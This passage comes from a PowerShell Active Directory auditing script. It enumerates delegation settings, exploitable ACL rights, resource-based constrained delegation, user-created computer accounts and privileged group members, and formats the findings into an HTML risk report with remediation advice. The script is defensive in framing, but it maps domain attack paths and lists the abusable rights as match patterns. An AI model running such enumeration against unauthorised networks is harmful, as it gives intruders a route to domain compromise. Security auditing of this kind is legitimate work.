		$HTMLUnconstrained = $TempUnconstrained | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='Unconstrained'>Unconstrained Delegation</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='Unconstrained'>" }

		$UnconstrainedTable = [PSCustomObject]@{
			"Risk Rating" = "Critical - Needs Immediate Attention"
			"Description" = "Unconstrained Delegation enables attackers to extract TGTs from memory and impersonate users or machines, leading to full domain compromise."
			"Remediation" = "Implement Constrained Delegation or Resource-Based Constrained Delegation for more secure alternatives"
		}
		
		$HTMLUnconstrainedTable = $UnconstrainedTable | ConvertTo-Html -As List -Fragment
		$HTMLUnconstrainedTable = "<div class='report-section' style='display:none;'>$HTMLUnconstrainedTable</div>"
	}
		
	if($NoDelegation){}
  	else{
	
		#############################################################
	    ########### Constrained Delegation (Computers)###############
		#############################################################
	
	    Write-Host ""
		Write-Host "Constrained Delegation (Computers)" -ForegroundColor Cyan
		$TempConstrainedDelegationComputers = foreach ($AllDomain in $AllDomains) {
			#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
			$ConstrainedDelegationComputers = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_."msds-allowedtodelegateto"})
			foreach ($ConstrainedDelegationComputer in $ConstrainedDelegationComputers) {
				if($ConstrainedDelegationComputer.DnsHostName){$IPAddress = Resolve-DnsName -Name $ConstrainedDelegationComputer.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
				if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
				[PSCustomObject]@{
					Domain = $AllDomain
					"Name" = $ConstrainedDelegationComputer.samaccountname
					"Enabled" = if ($ConstrainedDelegationComputer.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$ConstrainedDelegationComputer.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ConstrainedDelegationComputer.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"IP Address" = $IPAddress
					"Operating System" = $ConstrainedDelegationComputer.operatingsystem
					"Account SID" = GetSID-FromBytes -sidBytes $ConstrainedDelegationComputer.objectsid
					"msds-AllowedToDelegateTo" = $ConstrainedDelegationComputer."msds-AllowedToDelegateTo" -join " - "
				}
				$IPAddress = $null
			}
		}

  		if ($TempConstrainedDelegationComputers) {
			if(!$NoOutput){$TempConstrainedDelegationComputers | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLConstrainedDelegationComputers = $TempConstrainedDelegationComputers | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ConstrainedDelegationComputers'>Constrained Delegation (Computers)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ConstrainedDelegationComputers'>" }

   			$ConstrainedDelegationComputersTable = [PSCustomObject]@{
				"Recommendations" = "Regularly review and audit the delegation settings to ensure they align with the principle of least privilege. Limit delegation to only the necessary resources and services."
			}
			
			$HTMLConstrainedDelegationComputersTable = $ConstrainedDelegationComputersTable | ConvertTo-Html -As List -Fragment
   			$HTMLConstrainedDelegationComputersTable = $HTMLConstrainedDelegationComputersTable.Replace("*", "Recommendations")
			$HTMLConstrainedDelegationComputersTable = "<div class='report-section' style='display:none;'>$HTMLConstrainedDelegationComputersTable</div>"
		}
	
		
		#########################################################
	    ########### Constrained Delegation (Users)###############
		#########################################################
	
	    Write-Host ""
		Write-Host "Constrained Delegation (Users)" -ForegroundColor Cyan
		$TempConstrainedDelegationUsers = foreach ($AllDomain in $AllDomains) {
			$ConstrainedDelegationUsers = @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain -AND $_."msds-allowedtodelegateto"})
			foreach ($ConstrainedDelegationUser in $ConstrainedDelegationUsers) {
				[PSCustomObject]@{
					Domain = $AllDomain
					"Name" = $ConstrainedDelegationUser.Name
					"Enabled" = if ($ConstrainedDelegationUser.useraccountcontrol -band 2) { "False" } else { "True" }
					"Active" = if(!$ConstrainedDelegationUser.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ConstrainedDelegationUser.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
					"Adm" = if(($TempBuiltInAdministrators | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"DA" = if(($TempDomainAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"EA" = if(($TempEnterpriseAdmins | Where-Object {$_."Group Domain" -eq $AllDomain -AND $_."Member Name"})."Member Name" | Where-Object { $ConstrainedDelegationUser.samaccountname.Contains($_) }) { "YES" } else { "NO" }
					"Last Logon" = if($ConstrainedDelegationUser.lastlogontimestamp){Convert-LdapTimestamp -timestamp $ConstrainedDelegationUser.lastlogontimestamp}else{""}
					"SID" = GetSID-FromBytes -sidBytes $ConstrainedDelegationUser.objectSID
					"msds-AllowedToDelegateTo" = $ConstrainedDelegationUser."msds-AllowedToDelegateTo" -join " - "
				}
			}
		}

  		if ($TempConstrainedDelegationUsers) {
			if(!$NoOutput){$TempConstrainedDelegationUsers | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
			$HTMLConstrainedDelegationUsers = $TempConstrainedDelegationUsers | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='ConstrainedDelegationUsers'>Constrained Delegation (Users)</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='ConstrainedDelegationUsers'>" }

   			$ConstrainedDelegationUsersTable = [PSCustomObject]@{
				"Recommendations" = "Regularly review and audit the delegation settings to ensure they align with the principle of least privilege. Limit delegation to only the necessary resources and services."
			}
			
			$HTMLConstrainedDelegationUsersTable = $ConstrainedDelegationUsersTable | ConvertTo-Html -As List -Fragment
   			$HTMLConstrainedDelegationUsersTable = $HTMLConstrainedDelegationUsersTable.Replace("*", "Recommendations")
			$HTMLConstrainedDelegationUsersTable = "<div class='report-section' style='display:none;'>$HTMLConstrainedDelegationUsersTable</div>"
		}
	
		
		###########################################################
	    ######## Resource Based Constrained Delegation ############
		###########################################################
	    
		if($RBCD -OR $AllEnum){
	  		Write-Host ""
			Write-Host "Resource Based Constrained Delegation" -ForegroundColor Cyan
			$ExcludedAccounts = "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Exchange Recipient Administrators|Exchange Domain Servers|Exchange Organization Administrators|Exchange Public Folder Administrators|Managed Availability Servers|Exchange Windows Permissions|SELF|SYSTEM|Domain Admins|Enterprise|CREATOR OWNER|BUILTIN|Key Admins|MSOL|Account Operators|Terminal Server License Servers"
			$PlusExcludedAccounts = @($DAEABA | Where-Object{$_.domain -eq $AllDomain})
			$PlusExcludedAccounts = ($PlusExcludedAccounts | Where-Object {$_.samaccountname}).samaccountname -join "|"
			$ExcludedAccounts = $ExcludedAccounts + "|" + $PlusExcludedAccounts
			
			# Load the required assembly
			Add-Type -AssemblyName System.DirectoryServices
			
			$RBACDObjects = foreach ($AllDomain in $AllDomains) {
				$domainSID = $TempTargetDomains | Where-Object {$_.Domain -eq $AllDomain} | Select-Object -ExpandProperty "Domain SID"
				$TargetDomainComputers = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain})
			
				# Retrieve the GUID to Name mapping
				$guidMap = $null
				$guidMap = $AllGUIDMappings["$AllDomain"]
				
				# Iterate over each Machine
				$Results = @()
				$Results = foreach ($comp in $TargetDomainComputers) {
					$distname = $comp.distinguishedname
					$ldapPath = "LDAP://$distname"
					$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
					$securityDescriptor = $ouEntry.ObjectSecurity
					
					foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
						# Resolve ObjectType and InheritedObjectType using the GUID map
						$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
						#$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }

						<# ## Do the SID conversion first ?
						if(Test-SidFormat -SidString $ace.IdentityReference.Value){
							$TargetFinalSID = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $ace.IdentityReference.Value}
							$FinalSID = $TargetFinalSID.samaccountname
							if(!$FinalSID){$FinalSID = $ace.IdentityReference.Value}
						}
						else{$FinalSID = $ace.IdentityReference.Value} #>
						
						if(Test-SidFormat -SidString $ace.IdentityReference.Value){
							foreach($SumGroupsUser in $SumGroupsUsers){
								if($ace.IdentityReference.Value -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
									$TryToExtractMember = $SumGroupsUser
									break
								}
							}
							if($TryToExtractMember){$FinalRBCDAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
							else{$FinalRBCDAccount = $ace.IdentityReference.Value}
						}
						else{
							try {
								$tempholder = $ace.IdentityReference.Value
								$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
								$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
								$FinalRBCDAccount = $memberUser.Value
							} catch {
								$FinalRBCDAccount = $ace.IdentityReference.Value
							}
						}

						$ExtractObjCategory = $null
						$ExtractObjCategory = ($comp.objectcategory -split ",")[0] -replace "CN=",""
						
						# Create a custom object with the resolved names
						[PSCustomObject]@{
							Domain = $AllDomain
							"Account" = $FinalRBCDAccount
							"Object" = $comp.samaccountname
							"Category" = $ExtractObjCategory
							#AccessControlType = $ace.AccessControlType
							#InheritedObjectType = $inheritedObjectTypeName
							"AD Rights" = $ace.ActiveDirectoryRights
							"Object Ace Type" = $objectTypeName
						}
					}
				}
				
				$Results | Where-Object {
					# Match specific AD Rights
					$_."AD Rights" -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and
					
					(($_."AD Rights" -notmatch "WriteProperty") -or (($_."Object Ace Type" -match "msDS-AllowedToActOnBehalfOfOtherIdentity") -or ($_."Object Ace Type" -match "Any"))) -and

					# Exclude specific accounts
					$_.Account -notmatch $ExcludedAccounts
				} |
					Group-Object "Account", "Object", "AD Rights", "Domain" |
					ForEach-Object {
						[PSCustomObject]@{
							"Domain" = $_.Group[0].Domain
							"Account" = $_.Group[0].Account
							"Object" = $_.Group[0]."Object"
							"Category" = $_.Group[0]."Category"
							"AD Rights" = $_.Group[0]."AD Rights"
							"Object Ace Type" = ($_.Group | ForEach-Object { if($_."Object Ace Type"){$_."Object Ace Type"} }) -join ', '
						}
					}
			}

   			if ($RBACDObjects) {
				if(!$NoOutput){$RBACDObjects | Sort-Object Domain,Account,"Object" | Format-Table -AutoSize -Wrap}
				$HTMLRBACDObjects = $RBACDObjects | Sort-Object Domain,Account,"Object" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='RBCDObjects'>Resource Based Constrained Delegation</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='RBCDObjects'>" }

    				$RBCDTable = [PSCustomObject]@{
					"Recommendations" = "Regularly review and audit the delegation settings to ensure they align with the principle of least privilege. Limit delegation to necessary resources and services only."
				}
				
				$HTMLRBCDTable = $RBCDTable | ConvertTo-Html -As List -Fragment
    			$HTMLRBCDTable = $HTMLRBCDTable.Replace("*", "Recommendations")
				$HTMLRBCDTable = "<div class='report-section' style='display:none;'>$HTMLRBCDTable</div>"
			}
  		}
		
		###########################################################
	    ######## Weak Permissions ############
		###########################################################
	    
		if($WeakPermissions -OR $AllEnum){
	  		Write-Host ""
			Write-Host "Weak Permissions" -ForegroundColor Cyan
			$ExcludedAccounts = "IIS_IUSRS|Certificate Service DCOM Access|Cert Publishers|Public Folder Management|Group Policy Creator Owners|Windows Authorization Access Group|Denied RODC Password Replication Group|Organization Management|Exchange Servers|Exchange Trusted Subsystem|Exchange Recipient Administrators|Exchange Domain Servers|Exchange Organization Administrators|Exchange Public Folder Administrators|Managed Availability Servers|Exchange Windows Permissions|SELF|SYSTEM|Domain Admins|Enterprise|CREATOR OWNER|BUILTIN|Key Admins|MSOL|Account Operators|Terminal Server License Servers"
			$PlusExcludedAccounts = @($DAEABA | Where-Object{$_.domain -eq $AllDomain})
			$PlusExcludedAccounts = ($PlusExcludedAccounts | Where-Object {$_.samaccountname}).samaccountname -join "|"
			$ExcludedAccounts = $ExcludedAccounts + "|" + $PlusExcludedAccounts
			
			# Load the required assembly
			Add-Type -AssemblyName System.DirectoryServices
			
			$WeakPermissionsObjects = foreach ($AllDomain in $AllDomains) {
				$domainSID = $TempTargetDomains | Where-Object {$_.Domain -eq $AllDomain} | Select-Object -ExpandProperty "Domain SID"
				$TargetDomainComputers = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain}) + @($TotalEnabledUsers | Where-Object {$_.domain -eq $AllDomain}) + @($TotalGroups | Where-Object {$_.domain -eq $AllDomain})
			
				# Retrieve the GUID to Name mapping
				$guidMap = $null
				$guidMap = $AllGUIDMappings["$AllDomain"]
				
				# Iterate over each Machine
				$Results = @()
				$Results = foreach ($comp in $TargetDomainComputers) {
					$distname = $comp.distinguishedname
					$ldapPath = "LDAP://$distname"
					$ouEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath)
					$securityDescriptor = $ouEntry.ObjectSecurity
					
					foreach ($ace in $securityDescriptor.GetAccessRules($true, $true, [System.Security.Principal.NTAccount])) {
						# Resolve ObjectType and InheritedObjectType using the GUID map
						$objectTypeName = if ($ace.ObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.ObjectType] } else { "Any" }
						#$inheritedObjectTypeName = if ($ace.InheritedObjectType -ne [System.Guid]::Empty) { $guidMap[$ace.InheritedObjectType] } else { "Any" }

						<# ## Do the SID conversion first ?
						if(Test-SidFormat -SidString $ace.IdentityReference.Value){
							$TargetFinalSID = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq $ace.IdentityReference.Value}
							$FinalSID = $TargetFinalSID.samaccountname
							if(!$FinalSID){$FinalSID = $ace.IdentityReference.Value}
						}
						else{$FinalSID = $ace.IdentityReference.Value} #>
						
						if(Test-SidFormat -SidString $ace.IdentityReference.Value){
							foreach($SumGroupsUser in $SumGroupsUsers){
								if($ace.IdentityReference.Value -eq (GetSID-FromBytes -sidBytes $SumGroupsUser.objectsid)){
									$TryToExtractMember = $SumGroupsUser
									break
								}
							}
							if($TryToExtractMember){$FinalRBCDAccount = "$($TryToExtractMember.domain)\$($TryToExtractMember.samaccountname)"}
							else{$FinalRBCDAccount = $ace.IdentityReference.Value}
						}
						else{
							try {
								$tempholder = $ace.IdentityReference.Value
								$memberSID = New-Object System.Security.Principal.SecurityIdentifier($tempholder)
								$memberUser = $memberSID.Translate([System.Security.Principal.NTAccount])
								$FinalRBCDAccount = $memberUser.Value
							} catch {
								$FinalRBCDAccount = $ace.IdentityReference.Value
							}
						}

						$ExtractObjCategory = $null
						$ExtractObjCategory = ($comp.objectcategory -split ",")[0] -replace "CN=",""
						
						# Create a custom object with the resolved names
						[PSCustomObject]@{
							Domain = $AllDomain
							"Account" = $FinalRBCDAccount
							"Object" = $comp.samaccountname
							"Category" = $ExtractObjCategory
							#AccessControlType = $ace.AccessControlType
							#InheritedObjectType = $inheritedObjectTypeName
							"AD Rights" = $ace.ActiveDirectoryRights
							"Object Ace Type" = $objectTypeName
						}
					}
				}
				
				$Results | Where-Object {
					# Match specific AD Rights
					$_."AD Rights" -match "GenericWrite|GenericAll|WriteDacl|WriteOwner|WriteProperty|WriteSPN|WriteAccountRestrictions|AllExtendedRights|ExtendedRight|AddAllowedToAct|SyncLAPSPassword|ForceChangePassword|Self" -and

					# Exclude specific accounts
					$_.Account -notmatch $ExcludedAccounts -and

					# Exclude specific Object Ace Types
					$_."Object Ace Type" -ne "Change Password" -and
					$_."Object Ace Type" -ne "Send To" -and
					$_."Object Ace Type" -ne "Lockout-Time" -and
					$_."Object Ace Type" -ne "Send As" -and
					$_."Object Ace Type" -ne "Personal Information" -and
					$_."Object Ace Type" -ne "Personal Information, Send As" -and

					# Show only Self AD Rights if Object Ace Type is Self-Membership
					(
						($_."AD Rights" -notmatch "Self") -or ($_."Object Ace Type" -match "Self-Membership")
					)
				} |
					Group-Object "Account", "Object", "AD Rights", "Domain" |
					ForEach-Object {
						[PSCustomObject]@{
							"Domain" = $_.Group[0].Domain
							"Account" = $_.Group[0].Account
							"Object" = $_.Group[0]."Object"
							"Category" = $_.Group[0]."Category"
							"AD Rights" = $_.Group[0]."AD Rights"
							"Object Ace Type" = ($_.Group | ForEach-Object { if($_."Object Ace Type"){$_."Object Ace Type"} }) -join ', '
						}
					}
			}

   			# Filter $WeakPermissionsObjects to exclude any entries already in $RBACDObjects
			$WeakPermissionsObjects = $WeakPermissionsObjects | Where-Object {
				$weakObject = $_
				-not ($RBACDObjects | Where-Object {
					$_.Domain -eq $weakObject.Domain -and
					$_.Account -eq $weakObject.Account -and
					$_.Object -eq $weakObject.Object -and
					$_.Category -eq $weakObject.Category -and
					$_."AD Rights" -eq $weakObject."AD Rights" -and
					$_."Object Ace Type" -eq $weakObject."Object Ace Type"
				})
			}

   			if ($WeakPermissionsObjects) {
				if(!$NoOutput){$WeakPermissionsObjects | Sort-Object Domain,Account,"Object" | Format-Table -AutoSize -Wrap}
				$HTMLWeakPermissionsObjects = $WeakPermissionsObjects | Sort-Object Domain,Account,"Object" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='WeakPermissions'>Weak Permissions</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='WeakPermissions'>" }

    				$WeakPermissionsTable = [PSCustomObject]@{
					"Recommendations" = "Regularly review and audit permissions to ensure they align with the principle of least privilege. Limit them to necessary resources and services only."
				}
				
				$HTMLWeakPermissionsTable = $WeakPermissionsTable | ConvertTo-Html -As List -Fragment
    			$HTMLWeakPermissionsTable = $HTMLWeakPermissionsTable.Replace("*", "Recommendations")
				$HTMLWeakPermissionsTable = "<div class='report-section' style='display:none;'>$HTMLWeakPermissionsTable</div>"
			}
  		}
		
		###########################################################
		######## Allowed To Act On Behalf Of Other Identity ############
		###########################################################
		
		if($WeakPermissions -OR $AllEnum){
			Write-Host ""
			Write-Host "Allowed To Act On Behalf Of Other Identity" -ForegroundColor Cyan
			$AccessAllowedComputers = foreach ($AllDomain in $AllDomains) {
				
				$AllowedToActComputers = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_."msDS-AllowedToActOnBehalfOfOtherIdentity"})
				
				foreach ($AllowedToActComputer in $AllowedToActComputers) {
					
					$ActBytes = $AllowedToActComputer."msDS-AllowedToActOnBehalfOfOtherIdentity"
					$ActDescriptor = New-Object System.Security.AccessControl.RawSecurityDescriptor($ActBytes, 0)
					$ActAce = $ActDescriptor.DiscretionaryAcl | Where-Object { $_.AceQualifier -eq "AccessAllowed" }
					$ActSid = $ActAce.SecurityIdentifier
					$ActAccount = $ActSid.Translate([System.Security.Principal.NTAccount])
					$AllowedToActIdentity = $ActAccount.Value
					
					if($AllowedToActComputer.DnsHostName){$IPAddress = Resolve-DnsName -Name $AllowedToActComputer.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
					
					[PSCustomObject]@{
						Machine = $AllowedToActComputer.samaccountname
						"IP Address" = $IPAddress
						"Operating System" = $AllowedToActComputer.operatingsystem
						"Machine SID" = GetSID-FromBytes -sidBytes $AllowedToActComputer.objectsid
						"Identity" = $AllowedToActIdentity
						"Identity SID" = $ActSid.Value
						Domain = "$AllDomain"
					}
					$IPAddress = $null
				}
			}
		
			if ($AccessAllowedComputers) {
				if(!$NoOutput){$AccessAllowedComputers | Sort-Object Domain,Machine | Format-Table -AutoSize -Wrap}
				$HTMLAccessAllowedComputers = $AccessAllowedComputers | Sort-Object Domain,Machine | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AllowedToAct'>Allowed To Act On Behalf Of Other Identity</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AllowedToAct'>" }
		
				$AccessAllowedComputersTable = [PSCustomObject]@{
					"Recommendations" = "Review the above computer objects and consider removing any security descriptor that was set to allow the specific Identity to act on behalf of other identities."
				}
				
				$HTMLAccessAllowedComputersTable = $AccessAllowedComputersTable | ConvertTo-Html -As List -Fragment
				$HTMLAccessAllowedComputersTable = $HTMLAccessAllowedComputersTable.Replace("*", "Recommendations")
				$HTMLAccessAllowedComputersTable = "<div class='report-section' style='display:none;'>$HTMLAccessAllowedComputersTable</div>"
			}
		}
		
		###########################################################
		######## Computer Objects created by regular users ############
		###########################################################
		
		if($UserCreatedObjects -OR $AllEnum){
			Write-Host ""
			Write-Host "Computer Objects created by regular users" -ForegroundColor Cyan
			$ADComputersCreated = foreach ($AllDomain in $AllDomains) {
				
				#$ResolveServer = $RIDRoleDCs | Where-Object {$matched = $false;foreach ($Extr in $ExtrDCs) {if ($_.dnshostname -eq "$Extr.$AllDomain") {$matched = $true;break}}$matched} | Select-Object -ExpandProperty dnshostname
				
				$DomainComputersCreated = @($TotalEnabledMachines | Where-Object {$_.domain -eq $AllDomain -AND $_."ms-DS-CreatorSID"})
				
				foreach ($ComputerCreated in $DomainComputersCreated) {
					
					$ComputerCreator = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $ComputerCreated.'ms-DS-CreatorSID')}
					if(!$ComputerCreator){$ComputerCreator = GetSID-FromBytes -sidBytes $ComputerCreated.'ms-DS-CreatorSID'}
										
					if($ComputerCreated.DnsHostName){$IPAddress = Resolve-DnsName -Name $ComputerCreated.DnsHostName -Type A | Select-Object -ExpandProperty IPAddress}
					if($IPAddress.count -gt 1){$IPAddress = $IPAddress -join ", "}
					
					[PSCustomObject]@{
						Name = $ComputerCreated.samaccountname
						"Enabled" = if ($ComputerCreated.useraccountcontrol -band 2) { "False" } else { "True" }
						"Active" = if(!$ComputerCreated.lastlogontimestamp){""} elseif ((Convert-LdapTimestamp -timestamp $ComputerCreated.lastlogontimestamp) -ge $inactiveThreshold) { "True" } else { "False" }
						"IP Address" = $IPAddress
						"Operating System" = $ComputerCreated.operatingsystem
						"Account SID" = GetSID-FromBytes -sidBytes $ComputerCreated.objectsid
						"Creator" = $ComputerCreator.samaccountname
						"Created" = $ComputerCreated.whenCreated
						Domain = "$AllDomain"
					}
					$IPAddress = $null
				}
			}
		
			if ($ADComputersCreated) {
				if(!$NoOutput){$ADComputersCreated | Sort-Object Domain,Name | Format-Table -AutoSize -Wrap}
				$HTMLADComputersCreated = $ADComputersCreated | Sort-Object Domain,Name | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='UserCreatedObjects'>Computer Objects created by regular users</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='UserCreatedObjects'>" }
		
				$ADComputersCreatedTable = [PSCustomObject]@{
					"Recommendations" = "Review the above computer objects and consider removing any ACE that was set to allow the specific user or group to domain join the computer."
				}
				
				$HTMLADComputersCreatedTable = $ADComputersCreatedTable | ConvertTo-Html -As List -Fragment
				$HTMLADComputersCreatedTable = $HTMLADComputersCreatedTable.Replace("*", "Recommendations")
				$HTMLADComputersCreatedTable = "<div class='report-section' style='display:none;'>$HTMLADComputersCreatedTable</div>"
			}
		}
  	}
	
	################################################
		######### Security Groups ###############
		################################################
		
	$SecurityGroupsBanner = "<h3>Security Groups</h3>"
	Write-Host ""
	Write-Host "Security Groups" -ForegroundColor Red
	Write-Host ""

	#################################################### 
	########### Security Groups ################
	####################################################
	
	#################################################### 
	########### Account Operators ################
	####################################################

	Write-Host ""
	Write-Host "Account Operators" -ForegroundColor Cyan
	$TempAccountOperators = @()
	$TempAccountOperators = foreach ($AllDomain in $AllDomains) {
		$AccountOperators = @()
		$AccountOperators = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Account Operators"
		foreach ($AccountOperator in $AccountOperators) {

			$isEnabled = if ($AccountOperator.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($AccountOperator.lastlogontimestamp) {
				$lastLogon = Convert-LdapTimestamp -timestamp $AccountOperator.lastlogontimestamp
			} else {
				$lastLogon = ""
			}
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $AccountOperator.samaccountname

			if (!$membername) {
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {
					$sid = $null
					try {
						$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop
					} catch {}
					$sid -eq (GetSID-FromBytes -sidBytes $AccountOperator.objectsid)
				}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if (!$isEnabled) {
					$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }
				}
				if (!$isActive) {
					if ($ExtractedMember.lastlogontimestamp) {
						$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp
					} else {
						$lastLogon = ""
					}
					$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name"  = $membername
				"Enabled"      = $isEnabled
				"Active"       = $isActive
				"Last Logon"   = $lastLogon
				"Member SID"   = GetSID-FromBytes -sidBytes $AccountOperator.objectsid
				"Group Domain" = $AccountOperator.domain
			}
		}
	}

	if ($TempAccountOperators) {
		if(!$NoOutput){$TempAccountOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | ft -Autosize -Wrap}
		$HTMLAccountOperators = $TempAccountOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='AccountOperators'>Account Operators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='AccountOperators'>" }
	}
	
	#################################################### 
	########### Backup Operators ################
	####################################################
	
	Write-Host ""
	Write-Host "Backup Operators" -ForegroundColor Cyan
	$TempBackupOperators = @()
	$TempBackupOperators = foreach ($AllDomain in $AllDomains) {
		$BackupOperators = @()
		$BackupOperators = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Backup Operators"
		foreach($BackupOperator in $BackupOperators){
			
			$isEnabled = if ($BackupOperator.useraccountcontrol -band 2) { "False" } else { "True" }
			if($BackupOperator.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $BackupOperator.lastlogontimestamp}else{$lastLogon = ""}
			$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			$membername = $BackupOperator.samaccountname
			if(!$membername){
				$ExtractedMember = @()
				$ExtractedMember = $SumGroupsUsers | Where-Object {$sid = $null;try {$sid = GetSID-FromBytes -sidBytes $_.objectsid -ErrorAction Stop}catch{};$sid -eq (GetSID-FromBytes -sidBytes $BackupOperator.objectsid)}
				$tempmembername = $ExtractedMember.samaccountname
				$memberdomain = $ExtractedMember.domain
				$membername = ($memberdomain -split "\.")[0] + "\" + $tempmembername
				if(!$isEnabled){$isEnabled = if ($ExtractedMember.useraccountcontrol -band 2) { "False" } else { "True" }}
				if(!$isActive){
					if($ExtractedMember.lastlogontimestamp){$lastLogon = Convert-LdapTimestamp -timestamp $ExtractedMember.lastlogontimestamp}else{$lastLogon = ""}
					$isActive = if ($lastLogon -eq ""){""} elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
				}
			}

			[PSCustomObject]@{
				"Name" = $membername
				"Enabled" = $isEnabled
				"Active" = $isActive
				"Last Logon" = $lastLogon
				"Member SID" = GetSID-FromBytes -sidBytes $BackupOperator.objectsid
				"Group Domain" = $BackupOperator.domain
			}

		}
	}

	if ($TempBackupOperators) {
		if(!$NoOutput){$TempBackupOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | Format-Table -Autosize -Wrap}
		$HTMLBackupOperators = $TempBackupOperators | Sort-Object -Unique "Group Domain","Name","Member SID" | ConvertTo-Html -Fragment -PreContent "<h2 data-linked-table='BackupOperators'>Backup Operators</h2>" | ForEach-Object { $_ -replace "<table>", "<table id='BackupOperators'>" }
	}
	
	#################################################### 
	########### Cert Publishers ################
	####################################################
	
	Write-Host ""
	Write-Host "Cert Publishers" -ForegroundColor Cyan
	$TempCertPublishersGroup = @()
	$TempCertPublishersGroup = foreach ($AllDomain in $AllDomains) {
		$CertPublishers = @()
		$CertPublishers = RecursiveGroupMembers -AllADObjects $SumGroupsUsers -Raw -Domain $AllDomain -Identity "Cert Publishers"
		foreach ($CertPublisher in $CertPublishers) {
			
			$isEnabled = if ($CertPublisher.useraccountcontrol -band 2) { "False" } else { "True" }
			if ($CertPublisher.lastlogontimestamp) {
				$lastLogon = Convert-LdapTimestamp -timestamp $CertPublisher.lastlogontimestamp
			} else {
				$lastLogon = ""
			}
			$isActive = if ($lastLogon -eq "") { "" } elseif ($lastLogon -ge $inactiveThreshold) { "True" } else { "False" }
			
